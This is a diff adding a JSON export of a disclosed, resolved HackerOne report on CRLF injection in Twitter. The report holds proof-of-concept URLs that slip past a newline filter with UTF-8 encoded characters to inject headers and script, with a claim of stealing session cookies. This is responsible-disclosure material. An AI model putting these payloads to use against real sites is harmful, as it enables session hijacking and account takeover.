@@ -1,0 +1,381 @@
+{
+    "id": 52042,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjA0Mg==",
+    "url": "https://hackerone.com/reports/52042",
+    "title": "HTTP Response Splitting (CRLF injection) in report_story",
+    "state": "Closed",
+    "substate": "resolved",
+    "readable_substate": "Resolved",
+    "created_at": "2015-03-15T07:49:31.208Z",
+    "submitted_at": "2015-03-15T07:49:31.208Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "filedescriptor",
+        "url": "/filedescriptor",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 61,
+        "url": "https://hackerone.com/x",
+        "handle": "x",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "X (Formerly Twitter)",
+            "twitter_handle": "XSecurity",
+            "website": "https://x.com",
+            "about": "X helps you create and share ideas and information instantly, without barriers."
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2015-04-21T17:59:23.057Z",
+    "bug_reporter_agreed_on_going_public_at": "2015-04-21T17:59:22.520Z",
+    "team_member_agreed_on_going_public_at": "2015-04-13T19:15:22.382Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Hi,\r\n\r\nI would like to report a HTTP Response Splitting vulnerability in https://twitter.com/i/safety/report_story that allows attackers to inject arbitrary headers and contents in the response. \r\n\r\n## PoC:\r\nhttps://twitter.com/i/safety/report_story?next_view=report_story_start&source=reporttweet&reported_user_id=1&reporter_user_id=1&is_media=true&is_promoted=true&reported_tweet_id=%E5%98%8A%E5%98%8DSet-Cookie:%20test\r\n\r\n## Details:\r\nThe page will set cookie for the parameter *reported_tweet_id*. However, it doesn't validate strictly if it is a number. Although there is a protection against CRLF injection by detecting the presence of any *NewLine* character (0x0a), it can be bypassed with characters encoded in UTF-8 as the the page will try to convert them back to the original Unicode form and extract the last byte. For example, *%E5%98%8A* => *U+560A* => *0A*.",
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 32110,
+            "file_name": "twitter_crlf.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/110/1273cf910bf42fb1b2819916fa0749685ae2db65/twitter_crlf.png?response-content-disposition=attachment%3B%20filename%3D%22twitter_crlf.png%22%3B%20filename%2A%3DUTF-8%27%27twitter_crlf.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6BUFUEE%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T081954Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDD9FHXU0ld2gtz64ZpnjlAw950FEQMqICGzFbRk4pC0AIhAMguqPvT6svEZTrq0b2WG76XHZFVJtNfIkDZQTZEBAWsKrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgygpHklaEgyfIVznI8qjwWOIdWktDm9Jabt75qlpVIMtXS%2FssDvdH3liIUrqSO%2Fn2cugELxTHsITAFkdxtpuIqUfC022kq1x7KnVsJ8dbHLeYcjqR%2BmyMsSM7Xr6UnozwhB4Y9cX%2F6UxIQ4Shov2Zz%2B4D9ygjyO8TAHyL4iD%2B6CaUtaTRDQPU4E5CflxhSrTzcxVSW%2BqeTqxyYZggcMEnSIhCb9IgOZ920mfAKlQNAc9hEp1VBpmPzgJ45%2F2pnRD4bAeZccOTQ2N7ai9tDdrydJZNrpSPB7gPdG8BDlQdEVpOmjIqxieGAy0zoKfSOl%2F5VHAxD0l8CodVdcp4kMEcdDDDNKGFD%2BYvWC25TJ5mw59Uk5USrQymohsM1fenBd610Hv6tbF2BGQAVrViDT2nJXnDxNQyRmqsIbJeitdGdnlpUpx45ObdZIcNmzHof%2FPv%2FVqoTgI06D0Wk6Z63VBvlhxWqLe%2BSaLcx2GAU%2Fy14hWDJEf7ZqhZ%2BM9OJtRIxfWXKISDxoTmTfZp%2F5B%2FiqubY1RL%2FDk%2BkMTxMcbSGw43o6kyeDbQbyyaDtV%2BYAWvx%2BSe9%2FhRFQPmqTdKCb%2BT23vEPLhAJ2vYsQ%2BTTeLcxLwsZ3TUOVQTBnE3%2FUfsxEMeVHPai2qUl0CGsun0HgjD95lQIzmeHal%2B%2BEP6LBM8JhmIfrmEmxecDlEpJEWMvTnef%2FUlhfSrGHNndRTanOi%2BSbxAkMtWE84y5d6km2hMzs9vO8ITHcwoDqJD9MHDjIWYVJG9MlQbnFckuSFWS1rIVtaRMcayfrXSfW9hMolo%2BRqzfol8wiNwiDk%2FCKe151LpjhbW4NYcVDBPgw8tG9ATi5pkPIxbtfE3grt%2BpRK%2Faq2%2F5BArkGIJcrN5tzOoFCLeiuMLOltqcGOrABo0TqeJmB%2BrDGBqaoTHwPAvK4%2FwgcpFFUm8NwdvRQDqlRqJax0yb%2BBe6w2ez9ShfsMMqJTOyg4Y%2FE%2BuAcIW10gTr%2BvpIXBkF%2F8x6GDpOA2qbdCvafgrSufD%2B5I4%2BvTz5e4TgiIX3QWw7OH4QNLX1OUdaUk3t0Pz5pXzlKIOWV579ZeH8AP1NSW2e%2Fj%2B8nGME4HiDOlB%2BZW%2FO8raM%2BngBp42hfPK0q4CctRMJh8z2fdSQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a24d59a10f20efe58b869653d872b3d50681361950ddaeac682e12438e186551",
+            "file_size": 85869,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2015-05-13T19:15:40.320Z",
+    "allow_singular_disclosure_after": -261752654.65336624,
+    "singular_disclosure_allowed": true,
+    "vote_count": 52,
+    "voters": [
+        "canarinho_pistola",
+        "chux",
+        "mr-medi",
+        "tolga",
+        "tess",
+        "dejavuln",
+        "h1bountyoverflow",
+        "anovg",
+        "ankitsingh",
+        "pinch",
+        "and 42 more..."
+    ],
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 356040,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!",
+            "automated_response": false,
+            "created_at": "2015-03-16T18:22:29.296Z",
+            "updated_at": "2015-03-16T18:22:29.296Z",
+            "actor": {
+                "username": "jcollins",
+                "cleared": false,
+                "verified": false,
+                "url": "/jcollins",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        },
+        {
+            "id": 357482,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "This issue can be extended to enable the attacker to steal certain httpOnly protected cookies, namely *\\_twitter_sess* and *auth_token*, so that the attacker can take over the victim's session.\n\nPoC (works on Firefox): [https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE](https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%29%E5%98%BE)\n\n",
+            "automated_response": false,
+            "created_at": "2015-03-18T10:52:00.575Z",
+            "updated_at": "2015-03-18T11:02:18.550Z",
+            "actor": {
+                "username": "filedescriptor",
+                "cleared": false,
+                "verified": false,
+                "url": "/filedescriptor",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        },
+        {
+            "id": 357504,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Here is a video demonstration to depict the above issue:\nhttps://vimeo.com/122522782 (Password: canvas)",
+            "automated_response": false,
+            "created_at": "2015-03-18T11:22:46.983Z",
+            "updated_at": "2015-03-18T11:22:46.983Z",
+            "actor": {
+                "username": "filedescriptor",
+                "cleared": false,
+                "verified": false,
+                "url": "/filedescriptor",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        },
+        {
+            "id": 358951,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi, thank you for the additional information. We are working to resolve this as quickly as possible. Thank you for your patience.",
+            "automated_response": false,
+            "created_at": "2015-03-19T21:29:05.458Z",
+            "updated_at": "2015-03-19T21:29:05.458Z",
+            "actor": {
+                "username": "jcollins",
+                "cleared": false,
+                "verified": false,
+                "url": "/jcollins",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        },
+        {
+            "id": 359837,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.",
+            "automated_response": false,
+            "created_at": "2015-03-21T03:43:31.239Z",
+            "updated_at": "2015-03-21T03:43:31.239Z",
+            "actor": {
+                "url": "/x",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "profile": {
+                    "name": "X (Formerly Twitter)"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "x",
+            "collaborator": {
+                "username": "filedescriptor",
+                "url": "/filedescriptor"
+            }
+        },
+        {
+            "id": 364983,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!",
+            "automated_response": false,
+            "created_at": "2015-03-27T22:32:41.461Z",
+            "updated_at": "2015-03-27T22:32:41.461Z",
+            "actor": {
+                "username": "jcollins",
+                "cleared": false,
+                "verified": false,
+                "url": "/jcollins",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "filedescriptor",
+                "url": "/filedescriptor"
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        },
+        {
+            "id": 365124,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I can confirm this is fixed, thanks!\nBy the way, may I know the root cause of this issue? I wonder if this is Twitter specific or  framework related.",
+            "automated_response": false,
+            "created_at": "2015-03-28T06:32:12.667Z",
+            "updated_at": "2015-03-28T06:33:29.197Z",
+            "actor": {
+                "username": "filedescriptor",
+                "cleared": false,
+                "verified": false,
+                "url": "/filedescriptor",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        },
+        {
+            "id": 379085,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Hi, thank you for reporting this issue.\n\nUnfortunately, we cannot provide information about the cause of the vulnerability.\n\nWe are requesting public disclosure of this bug to encourage more reports of this quality. Thanks again!",
+            "automated_response": false,
+            "created_at": "2015-04-13T19:15:22.497Z",
+            "updated_at": "2015-04-13T19:15:22.497Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "jcollins",
+                "cleared": false,
+                "verified": false,
+                "url": "/jcollins",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        },
+        {
+            "id": 386573,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2015-04-21T17:59:22.621Z",
+            "updated_at": "2015-04-21T17:59:22.621Z",
+            "actor": {
+                "username": "filedescriptor",
+                "cleared": false,
+                "verified": false,
+                "url": "/filedescriptor",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        },
+        {
+            "id": 386574,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2015-04-21T17:59:23.087Z",
+            "updated_at": "2015-04-21T17:59:23.087Z",
+            "actor": {
+                "username": "filedescriptor",
+                "cleared": false,
+                "verified": false,
+                "url": "/filedescriptor",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "x"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "id": 69,
+            "category": "researcher",
+            "content": "Write-up: https://blog.innerht.ml/twitter-crlf-injection/",
+            "user": {
+                "id": 9081,
+                "username": "filedescriptor",
+                "name": "filedescriptor",
+                "bio": "\\\"",
+                "cleared": false,
+                "verified": false,
+                "website": "https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ",
+                "location": "",
+                "created_at": "2014-08-16T03:54:09.722Z",
+                "url": "https://hackerone.com/filedescriptor",
+                "hackerone_triager": false,
+                "hackerone_employee": false,
+                "user_type": "hacker",
+                "profile_picture_urls": {
+                    "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
+                    "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                }
+            },
+            "can_view?": true,
+            "can_create?": false,
+            "attachments": []
+        }
+    ]
+}
